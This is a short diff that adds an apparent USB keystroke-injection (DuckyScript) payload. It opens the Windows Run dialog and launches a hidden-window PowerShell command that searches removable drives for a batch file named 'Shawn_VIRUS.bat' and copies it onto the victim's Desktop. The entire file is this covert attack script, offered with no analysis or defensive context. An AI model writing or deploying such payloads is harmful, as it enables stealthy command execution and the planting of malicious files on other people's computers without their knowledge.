@@ -1,0 +1,7 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -NoProfile -WindowStyle Hidden -Command "Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -ne 'C:\' } | ForEach-Object { $p=Join-Path $_.Root 'Shawn_VIRUS.bat'; if(Test-Path $p){ Copy-Item $p -Destination ([Environment]::GetFolderPath('Desktop')) -Force; break } }"
+DELAY 200
+ENTER
+
